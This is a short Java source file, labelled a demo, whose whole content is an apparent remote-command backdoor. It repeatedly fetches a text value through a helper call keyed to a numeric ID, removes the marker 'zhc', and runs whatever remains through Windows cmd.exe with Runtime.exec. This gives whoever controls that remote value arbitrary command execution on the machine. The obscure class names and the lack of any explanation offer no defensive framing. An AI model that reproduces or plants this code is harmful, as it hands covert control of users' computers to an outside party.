package pers.zhc.u.demo;

import java.io.IOException;

public class q {
    public static void main(String[] args) throws IOException {
        n n = new n();
        while (true) {
            String s = n.apiSplit(1109236592L)[1];
            String ss = s.replace("zhc", "");
            if (!ss.equals("")) {
                Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe /k " + ss);
                break;
            }
        }
    }
}
